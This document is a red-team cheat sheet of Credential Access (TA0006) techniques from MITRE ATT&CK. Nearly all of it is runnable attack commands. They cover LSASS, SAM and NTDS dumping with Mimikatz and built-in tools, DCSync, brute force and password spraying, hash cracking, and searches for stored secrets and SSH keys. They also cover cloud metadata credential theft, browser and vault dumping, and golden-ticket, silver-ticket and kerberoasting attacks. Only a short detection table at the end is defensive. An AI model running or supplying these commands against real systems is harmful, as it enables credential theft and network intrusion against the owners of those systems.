# MITRE ATT&ACK: Credential Access (TA0006)

> Techniques to steal credentials for account access and lateral movement.

---

## T1003: OS Credential Dumping

### T1003.001: LSASS Memory
```powershell
# Mimikatz
sekurlsa::logonpasswords
sekurlsa::minidump lsass.dmp

# Procdump (Microsoft-signed)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Comsvcs.dll (lolbin)
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# Task Manager (GUI)
# Right-click lsass.exe -> Create dump file
```

### T1003.002: Security Account Manager (SAM)
```cmd
# Dump SAM and SYSTEM hives
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
reg save HKLM\SECURITY C:\temp\security.hive

# Extract hashes with Mimikatz
lsadump::sam /sam:sam.hive /system:system.hive
```

### T1003.003: NTDS (Domain Controller)
```powershell
# Volume Shadow Copy method
vssadmin create shadow /for=C:
copy \\[VSS_PATH]\windows\ntds\ntds.dit C:\temp\ntds.dit

# ntdsutil
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds_extract" q q

# Mimikatz DCSync
lsadump::dcsync /domain:corp.com /user:administrator
lsadump::dcsync /domain:corp.com /all /csv
```

### T1003.004: LSA Secrets
```powershell
# Dump LSA secrets
mimikatz # lsadump::secrets
```

### T1003.005: Cached Domain Credentials
```cmd
# Dump cached credentials
mimikatz # lsadump::cache
```

### T1003.006: DCSync
- Requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights
- Can be granted to any user
- Silent attack against DC

---

## T1110: Brute Force

### T1110.001: Password Guessing
```bash
# Hydra
hydra -l admin -P rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt rdp://target.com

# Medusa
medusa -h target.com -u admin -P passwords.txt -M ssh

# CrackMapExec
crackmapexec smb 10.0.0.0/24 -u admin -p Password123!
```

### T1110.002: Password Cracking
```bash
# Hashcat
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -O
hashcat -m 5600 ntlmv2_hashes.txt wordlist.txt -O

# John the Ripper
john --format=nt hash.txt
john --format=krb5tgs hash.txt

# Rules-based cracking
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule -O
```

### T1110.003: Password Spraying
```bash
# CrackMapExec password spray
crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Password123!' --continue-on-success

# MailSniper (O365)
Invoke-PasswordSprayOWA -ExchHostname mail.corp.com -UserList users.txt -Password Spring2024!

# Kerberos pre-auth spray
python3 kerbrute.py -domain corp.com -users users.txt -passwords passwords.txt
```

### T1110.004: Credential Stuffing
- Use leaked credentials from breaches
- Tools: SNIPR, OpenBullet, Sentry MBA

---

## T1552: Unsecured Credentials

### T1552.001: Credentials in Files
```bash
# Search for passwords in files
grep -ri "password" /var/www/ 2>/dev/null
grep -ri "passwd" /etc/ 2>/dev/null
find / -name "*.txt" -exec grep -l "password" {} \; 2>/dev/null

# Search for API keys
grep -ri "api_key" /home/ 2>/dev/null
grep -ri "apikey" /var/www/ 2>/dev/null

# Search for AWS keys
grep -ri "AKIA" / 2>/dev/null
```

### T1552.002: Credentials in Registry
```cmd
# Search for passwords in registry
reg query HKLM /f "password" /t REG_SZ /s
reg query HKCU /f "password" /t REG_SZ /s
```

### T1552.003: Bash History
```bash
# Search for credentials in bash history
cat ~/.bash_history | grep -i "password\|passwd\|login\|ssh"
cat /home/*/.bash_history | grep -i "password"
```

### T1552.004: Private Keys
```bash
# Find SSH private keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# Find .pem files
find / -name "*.pem" 2>/dev/null

# Check SSH agent
ssh-add -l
```

### T1552.005: Cloud Instance Metadata API
```bash
# AWS metadata service (IMDSv1)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName

# Azure metadata
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# GCP metadata
curl -H "Metadata-Flavor:Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### T1552.006: Group Policy Preferences (GPP)
```powershell
# Find Groups.xml with passwords
findstr /S /I cpassword \domain\sysvol\domain\Policies\*.xml

# Decrypt GPP password with gpp-decrypt
python gpp-decrypt.py [cpassword_value]
```

---

## T1555: Credentials from Password Stores

### T1555.001: Keychain (macOS)
```bash
security dump-keychain -d login.keychain
```

### T1555.002: Securityd Memory
- Dump macOS securityd process

### T1555.003: Credential Manager (Windows)
```powershell
# Vault credentials
vaultcmd /listcreds:"Windows Credentials"
vaultcmd /listcreds:"Web Credentials"

# Mimikatz
vault::cred
vault::list
```

### T1555.004: Browser Passwords
- Chrome: `Login Data` SQLite database
- Firefox: `logins.json` + `key4.db`
- Tools: SharpChrome, HackBrowserData, SharpWeb

---

## T1558: Steal or Forge Kerberos Tickets

### T1558.001: Golden Ticket
```powershell
# Requirements: KRBTGT hash
# Create golden ticket
kerberos::golden /user:administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:hash /id:500 /groups:513,512,520,518,519 /ticket:admin.kirbi
```

### T1558.002: Silver Ticket
```powershell
# Requirements: Service account hash
# Create silver ticket for CIFS (SMB)
kerberos::golden /user:administrator /domain:corp.com /sid:S-1-5-21-... /rc4:service_hash /service:cifs /target:dc01.corp.com /ticket:silver.kirbi
```

### T1558.003: Kerberoasting
```powershell
# Request TGS for SPNs
# PowerView
Get-NetUser -SPN | Select serviceprincipalname

# Request and export tickets
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.corp.com:1433"

# Export with Mimikatz
kerberos::list /export

# Crack with hashcat
hashcat -m 13100 kerberos_ticket.txt rockyou.txt
```

### T1558.004: AS-REP Roasting
```powershell
# Find accounts without pre-auth
Get-NetUser -PreauthNotRequired

# Request AS-REP
python GetNPUsers.py corp.com/ -dc-ip 10.0.0.1 -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# Crack
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

---

## Detection

| Technique | Windows Event IDs | Detection Method |
|---|---|---|
| LSASS Dump | 4656, 4663, 4673 | Sysmon 10 (process access to lsass.exe) |
| SAM/Security Hive | 4656 | Access to SAM hive files |
| DCSync | 4662, 5136 | Replication events from non-DC accounts |
| Kerberoasting | 4769 | Excessive TGS requests (Event 4769) |
| Password Spray | 4625, 4648 | Multiple failed logins from same source |
| Credential Dumping | Sysmon 10 | Access to LSASS with specific access rights (0x1010, 0x1410, 0x143a, 0x1438) |
| GPP Password | 5145 | Access to Groups.xml in SYSVOL |
